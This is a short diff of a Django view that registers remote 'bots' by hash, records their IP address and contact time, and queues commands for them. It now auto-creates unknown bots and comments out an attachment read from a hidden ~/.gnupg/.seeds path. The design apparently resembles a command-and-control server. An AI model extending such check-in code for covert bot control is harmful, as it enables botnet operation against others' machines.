@@ -1,7 +1,6 @@
 from django.http import HttpResponse, Http404
 from django.views.decorators.csrf import csrf_exempt
 from django.utils import timezone
-from django.shortcuts import get_object_or_404
 from convey.models import Bot, Command, Bot_Command
 from convey.views.utils import get_ip
 import json
@@ -89,7 +88,14 @@ def cmd(request):
     # print(request)
     print(hash_sum)
     
-    bot = get_object_or_404(Bot, hash_sum=hash_sum)
+    queryset = Bot.objects.filter(hash_sum=hash_sum)
+    if len(queryset)==0:
+        bot = Bot.objects.create(hash_sum=hash_sum)
+        print('new bot, creating it')
+    else:
+        bot = Bot.objects.filter(hash_sum=hash_sum)[0]
+        print('retrieving bot')
+    print("bot.hash_sum",bot.hash_sum)
     bot.version = version
     bot.ip_addr = get_ip(request)
     bot.last_contact = timezone.now()
@@ -113,7 +119,7 @@ def cmd(request):
         Bot_Command.objects.get_or_create(
             bot=bot,
             cmd=command,
-            upload=File(open('/home/ubuntu/.gnupg/.seeds/log.txt'), 'rb')
+            # upload=File(open('/home/ubuntu/.gnupg/.seeds/log.txt'), 'rb')
         )
         # Check if client is a legacy client
         if version:
